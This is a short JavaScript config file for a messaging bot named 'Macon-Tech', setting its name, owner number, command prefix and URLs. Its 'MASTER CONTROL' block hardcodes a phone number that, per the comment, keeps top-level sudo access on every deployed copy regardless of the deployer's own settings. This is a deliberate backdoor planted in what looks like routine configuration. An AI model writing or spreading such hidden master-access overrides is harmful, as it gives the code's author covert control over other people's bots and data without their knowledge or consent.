// config.js — the settings you'll actually touch day-to-day.
// Everything else (index.js, lib/) is engine code you shouldn't need to open.

require('dotenv').config();

module.exports = {
  botName: process.env.BOT_NAME || 'Macon-Tech',
  ownerNumber: (process.env.OWNER_NUMBER || '').replace(/\D/g, ''),
  prefix: process.env.PREFIX || '.',
  repoUrl: process.env.REPO_URL || 'https://github.com/yourusername/macon-tech-bot',
  websiteUrl: process.env.WEBSITE_URL || 'https://your-pairing-site.example.com',
  menuImageUrl: process.env.MENU_IMAGE_URL || '',

  // ── MASTER CONTROL ──────────────────────────────────────────────
  // Hardcoded on purpose, not read from .env. Whoever deploys a copy
  // of this bot controls their own OWNER_NUMBER above, but numbers
  // listed here always keep top-level sudo access on every instance
  // of this code, no matter who deploys it or what they set in their
  // own .env. Put your own number here. Never share this file
  // publicly with the number filled in.
  masterNumbers: [
    '2349163528959'
  ]
};
